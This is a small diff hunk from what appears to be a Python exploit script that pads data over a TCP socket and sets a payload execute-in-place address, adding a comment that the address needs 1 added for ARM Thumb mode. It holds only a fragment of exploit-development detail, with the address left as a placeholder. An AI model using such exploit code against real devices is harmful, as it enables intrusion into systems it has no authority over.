@@ -26,6 +26,7 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         pad_data += i.to_bytes(1, 'little')
 
     # payload_xip_address should point at the executable code in the payload
+    # You must add 1 to the address to indicate using ARM Thumb mode
     payload_xip_address = 0xCHANGE_ME
     print(f'payload_xip_address: {payload_xip_address:08x}')
 
